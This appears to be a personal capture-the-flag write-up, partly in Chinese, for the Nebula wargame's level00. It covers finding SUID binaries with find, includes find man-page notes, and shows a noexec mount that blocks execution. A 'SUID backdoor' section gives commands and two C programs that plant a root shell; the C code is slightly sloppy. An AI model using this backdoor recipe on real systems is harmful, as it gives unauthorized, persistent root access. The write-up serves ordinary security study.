# Level00 

#### About 
 
This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.  
Alternatively, look at the find man page.  
To access this level, log in as level00 with the password of level00.  


#### Source code 

There is no source code available for this level  


#### Solutions 

```  
1. find / -perm -u+s -uid `id -u flag00` -type f 2>/dev/null  
   find / -perm -4000 -uid `id -u flag00` -type f 2>/dev/null  
   find / -type f -perm -4000 -uid `id -u flag00` -exec md5sum {} \; 2>/dev/null   
   ---->   4d0a23fc7855e3dc128c76e18beb11b1  /bin/.../flag00  
   ---->   4d0a23fc7855e3dc128c76e18beb11b1  /rofs/bin/.../flag00  
 
2. /bin/.../flag00  
3. getflag  
```

#### SUID backdoor 
``` 
su root  
cp /bin/bash /tmp/rootshell  
chmod u+s ~/rootshell  
su [someuser]  
/tmp/rootshell  
```
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main()
{
   seteuid( 0 ); // ---- Ubuntu/...
   setuid( 0 );
   system( "/bin/sh" );
 
   return 0;
}
```
```
#include <stdio.h>

int main()
{
    setresuid(0, 0, 0);
    execve("/bin/sh");
}
```

#### Recommend  
  
A. How to find SUID or GUID files ?  

find / -perm 755    # 权限为755  
find / -perm -4000  # 权限包含SUID即可  
find / -perm /4000  #  

rwx rwx rwx  
111 111 111  


-perm mode  
      mode 表示精确的权限位(可以是八进制数或符号)。如果想要使用符号位进行权限匹配，需要指定一个复杂的符号位字符串.  
      如果mode给的权限位不足3位，那么前面自动加0.  
      例如: -perm g=w，只匹配权限为0020的文件(只有用户的组具备写权限)。类似的还有 '/' 或 '-'，  
      例如: -perm -g=w，匹配组权限可写的所有文件.  


      File's permission bits are exactly mode (octal or symbolic).  Since an exact match is required, if  you  want  
      to use this form for symbolic modes, you may have to specify a rather complex mode string.  For example -perm  
      g=w will only match files which have mode 0020 (that is, ones for which group write permission  is  the  only  
      permission  set).   It is more likely that you will want to use the `/' or `-' forms, for example -perm -g=w,  
      which matches any file with group write permission.  See the EXAMPLES section for some illustrative examples.  


-perm -mode  
      所有为1的权限位必须都匹配.  
      文件所有设定的权限位。使用符号权限位时，需指定'u'，'g', 'o'.  

      All of the permission bits mode are set for the file.  Symbolic modes are accepted in this form, and this  is  
      usually  the  way  in  which  would want to use them.  You must specify `u', `g' or `o' if you use a symbolic  
      mode.   See the EXAMPLES section for some illustrative examples. 


-perm /mode  
      匹配任意为1的权限位. 
      文件任意权限位。使用符号权限位时，需指定'u'，'g', 'o'。如果未设定权限位，将会匹配任意文件(等效于-perm -000) 
      Any of the permission bits mode are set for the file.  Symbolic modes are accepted in this  form.   You  must  
      specify `u', `g' or `o' if you use a symbolic mode.  See the EXAMPLES section for some illustrative examples.  
      If no permission bits in mode are set, this test matches any file (the idea here is to be consistent with the  
      behaviour of -perm -000).  


-perm +mode  
      已经弃用，查询某种权限位的设置，等效于 -perm /mode. 
      Deprecated, old way of searching for files with any of the permission bits in mode set.  You should use -perm  
      /mode instead. Trying to use the `+' syntax with symbolic modes will yield surprising results.  For  example,  
      `+u+x' is a valid symbolic mode (equivalent to +u,+x, i.e. 0111) and will therefore not be evaluated as -perm  
      +mode but instead as the exact mode specifier -perm mode and so it matches files with exact permissions  0111  
      instead  of  files  with any execute bit set.  If you found this paragraph confusing, you're not alone - just  
      use -perm /mode.  This form of the -perm test is deprecated because  the  POSIX  specification  requires  the  
      interpretation of a leading `+' as being part of a symbolic mode, and so we switched to using `/' instead.  



find /tmp -name core -type f -print | xargs /bin/rm -f       # 如果文件名中包含core，就删除它  
find /tmp -name core -type f -print0 | xargs -0 /bin/rm -f   # 如果文件名中包含空格，引号，换行符，也可以正确处理.  
find /sbin /usr/sbin -executable \! -readable -print         # 寻找可执行，不可读的文件.  
find /tmp -type f -exec md5sum {} \; 2>/dev/null             # 对每个对象执行操作   

#### Questions

* 如何查找SUID程序?  
* 如何利用SUID制作后门 ？
* 文件权限(挂载选项--mount/fstab)

```
root@nebula:/home/level00# mount
/cow on / type overlayfs (rw)
proc on /proc type proc (rw,noexec,nosuid,nodev)
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
fusectl on /sys/fs/fuse/connections type fusectl (rw)
udev on /dev type devtmpfs (rw,mode=0755)
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
/dev/sr0 on /cdrom type iso9660 (ro,noatime)
/dev/loop0 on /rofs type squashfs (ro,noatime)
none on /sys/kernel/debug type debugfs (rw)
none on /sys/kernel/security type securityfs (rw)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
none on /run/shm type tmpfs (rw,nosuid,nodev)

root@nebula:/home/level00# cat /etc/fstab 
overlayfs / overlayfs rw 0 0
tmpfs /tmp tmpfs nosuid,noexec,nodev 0 0

root@nebula:/home/level00# mount -o remount,noexec /tmp 

root@nebula:/home/level00# mount
/cow on / type overlayfs (rw)
proc on /proc type proc (rw,noexec,nosuid,nodev)
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
fusectl on /sys/fs/fuse/connections type fusectl (rw)
udev on /dev type devtmpfs (rw,mode=0755)
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
/dev/sr0 on /cdrom type iso9660 (ro,noatime)
/dev/loop0 on /rofs type squashfs (ro,noatime)
none on /sys/kernel/debug type debugfs (rw)
none on /sys/kernel/security type securityfs (rw)
tmpfs on /tmp type tmpfs (rw,noexec,nosuid,nodev)
none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
none on /run/shm type tmpfs (rw,nosuid,nodev)

root@nebula:/home/level00# ls /tmp/
root.c  rootshell  tmux-1001

root@nebula:/home/level00# /tmp/rootshell
bash: /tmp/rootshell: Permission denied
```
